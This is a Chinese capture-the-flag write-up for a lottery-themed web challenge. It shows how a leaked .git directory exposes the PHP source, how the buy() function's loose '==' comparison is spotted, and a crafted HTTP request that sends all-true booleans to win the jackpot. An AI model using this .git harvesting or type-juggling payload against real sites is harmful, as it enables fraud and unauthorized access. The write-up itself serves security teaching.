**一.题目链接：**[**https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1711701862188**](https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1711701862188)

**二.****解题思路**

打开题目，是一个彩票网站，通过猜数字赢得奖金，奖金达到一定数额后可以购买flag

用扫描软件进行爆破，发现robots.txt，进而发现.git泄露，用[GitHack](https://github.com/lijiejie/GitHack)下载网站所有的源代码。

> [（附各种文件泄露利用方法）](https://lddp.github.io/2018/05/10/WEB-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F/)
>

```php
<?php
require_once('config.php');
header('Content-Type: application/json');

function response($resp){
	die(json_encode($resp));
}

function response_error($msg){
	$result = ['status'=>'error'];
	$result['msg'] = $msg;
	response($result);
}

function require_keys($req, $keys){
	foreach ($keys as $key) {
		if(!array_key_exists($key, $req)){
			response_error('invalid request');
		}
	}
}

function require_registered(){
	if(!isset($_SESSION['name']) || !isset($_SESSION['money'])){
		response_error('register first');
	}
}

function require_min_money($min_money){
	if(!isset($_SESSION['money'])){
		response_error('register first');
	}
	$money = $_SESSION['money'];
	if($money < 0){
		$_SESSION = array();
		session_destroy();
		response_error('invalid negative money');
	}
	if($money < $min_money){
		response_error('you don\' have enough money');
	}
}


if($_SERVER["REQUEST_METHOD"] != 'POST' || !isset($_SERVER["CONTENT_TYPE"]) || $_SERVER["CONTENT_TYPE"] != 'application/json'){
	response_error('please post json data');
}

$data = json_decode(file_get_contents('php://input'), true);
if(json_last_error() != JSON_ERROR_NONE){
	response_error('invalid json');
}

require_keys($data, ['action']);

// my boss told me to use cryptographically secure algorithm 
function random_num(){
	do {
		$byte = openssl_random_pseudo_bytes(10, $cstrong);
		$num = ord($byte);
	} while ($num >= 250);

	if(!$cstrong){
		response_error('server need be checked, tell admin');
	}
	
	$num /= 25;
	return strval(floor($num));
}

function random_win_nums(){
	$result = '';
	for($i=0; $i<7; $i++){
		$result .= random_num();
	}
	return $result;
}


function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
	}
	$money += $prize - 2;
	$_SESSION['money'] = $money;
	response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
}

function flag($req){
	global $flag;
	global $flag_price;

	require_registered();
	$money = $_SESSION['money'];
	if($money < $flag_price){
		response_error('you don\' have enough money');
	} else {
		$money -= $flag_price;
		$_SESSION['money'] = $money;
		$msg = 'Here is your flag: ' . $flag;
		response(['status'=>'ok','msg'=>$msg, 'money'=>$money]);
	}
}

function register($req){
	$name = $req['name'];
	$_SESSION['name'] = $name;
	$_SESSION['money'] = 20;

	response(['status'=>'ok']);
}


switch ($data['action']) {
	case 'buy':
		require_keys($data, ['numbers']);
		buy($data);
		break;

	case 'flag':
		flag($data);
		break;

	case 'register':
		require_keys($data, ['name']);
		register($data);
		break;
	
	default:
		response_error('invalid request');
		break;
}
```

从api.php中发现flag相关的内容，进行代码审计，在buy()函数中发现弱比较漏洞

```php
function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
	$win_numbers = random_win_nums();
	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
```

	网站在比较输入数字和中奖号码是否一致时并没有确认二者数据类型相同，且没有进行任何过滤。

  requests是json型，由于 json 支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入了

```php
POST /api.php HTTP/1.1
Host: 61.147.171.105:49218
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 36
Origin: http://61.147.171.105:49218
Connection: close
Referer: http://61.147.171.105:49218/buy.php
Cookie: PHPSESSID=6gkur49p51s56673ilh1hcsg01

{"action":"buy","numbers":
[true,true,true,true,true,true,true]}
```

放包

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1711708688602-b004bb10-7239-484b-9d8c-09ba10af60e5.png)

成功。

